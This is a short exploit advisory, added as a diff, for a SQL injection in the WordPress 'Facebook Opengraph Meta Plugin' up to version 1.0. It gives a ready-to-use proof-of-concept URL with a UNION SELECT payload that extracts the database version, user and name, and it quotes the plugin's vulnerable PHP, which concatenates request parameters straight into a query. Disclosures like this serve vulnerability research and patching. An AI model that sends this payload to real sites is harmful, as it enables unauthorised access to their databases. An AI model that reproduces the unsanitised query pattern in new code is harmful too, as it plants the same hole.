@@ -1,0 +1,51 @@
+# Exploit Title: WordPress Facebook Opengraph Meta Plugin plugin <= 1.0 SQL Injection Vulnerability
+# Date: 2011-09-03
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/facebook-opengraph-meta-plugin.zip
+# Version: 1.0 (tested)
+# Note: magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/facebook-opengraph-meta-plugin/all_meta.php?pst_title=1') UNION ALL SELECT CONCAT_WS(CHAR(44),version(),current_user(),database()),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--%20&page=100&rows=1
+
+---------------
+Vulnerable code
+---------------
+$page = $_GET['page']; // get the requested page
+$limit = $_GET['rows']; // get how many rows we want to have into the grid
+...
+if(isset($_REQUEST["pst_title"]))
+    $pst_title = $_REQUEST['pst_title'];
+...
+if($pst_title!=''){
+    $where.= " AND (wposts.post_title LIKE '%$pst_title%'";
+    $where.= " OR wpostmeta.meta_value LIKE '%$pst_title%')";
+}
+
+$result = $wpdb->get_var("SELECT COUNT(*) AS count FROM $wpdb->postmeta WHERE meta_key = '_OgMeta'");
+$count = $result['count'];
+if( $count >0 )
+{
+    $total_pages = ceil($count/$limit);
+}
+else
+{
+    $total_pages = 0;
+}
+if ($page > $total_pages)
+    $page=$total_pages; $start = $limit*$page - $limit;
+...
+$querystr = "
+    SELECT wposts.*
+    FROM $wpdb->posts wposts, $wpdb->postmeta wpostmeta
+    WHERE wposts.ID = wpostmeta.post_id
+    AND wpostmeta.meta_key = '_OgMeta'
+    AND wposts.post_status = 'publish'
+    AND (wposts.post_type = 'post' OR wposts.post_type = 'page')".$where.
+    "ORDER BY wposts.post_date DESC
+    LIMIT $start , $limit
+    ";
+
+$result = $wpdb->get_results($querystr);//, OBJECT);
